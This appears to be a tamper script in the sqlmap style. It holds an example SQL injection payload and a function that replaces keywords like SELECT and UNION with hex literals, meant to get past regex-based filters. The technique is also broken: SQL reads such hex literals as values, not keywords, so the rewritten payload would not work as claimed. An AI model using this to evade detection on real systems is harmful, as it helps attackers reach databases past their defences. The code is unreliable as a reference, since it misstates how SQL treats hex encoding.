__example_payload__ = "' AND 1=1 UNION SELECT NULL--"
__type__ = "hex encoding SQL keywords to bypass regex-based detection"


def tamper(payload, **kwargs):
    hex_map = {
        "SELECT": "0x53454c454354",
        "UNION": "0x554e494f4e",
        "NULL": "0x4e554c4c",
        "AND": "0x414e44",
        "OR": "0x4f52",
    }
    for key, value in hex_map.items():
        payload = payload.replace(key, value)
    return payload
